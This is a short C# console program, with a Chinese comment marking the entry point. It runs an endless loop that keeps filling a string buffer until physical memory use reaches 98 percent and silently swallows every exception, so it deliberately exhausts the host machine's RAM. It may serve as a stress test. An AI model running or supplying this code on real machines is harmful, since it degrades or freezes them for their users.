﻿using System;
using System.Text;

namespace mm
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            StringBuilder i = new StringBuilder(4096, int.MaxValue);
            while (true)
            {
                try
                {
                    while (GetMemoryRate() < 98)
                    {
                        i.Append(' ', 1024);
                    }
                }
                catch
                {

                }
            }
        }
        public static double GetMemoryRate()
        {
            return 100 - (double)(new Microsoft.VisualBasic.Devices.Computer()).Info.AvailablePhysicalMemory / (new Microsoft.VisualBasic.Devices.Computer()).Info.TotalPhysicalMemory * 100;
        }
    }
}
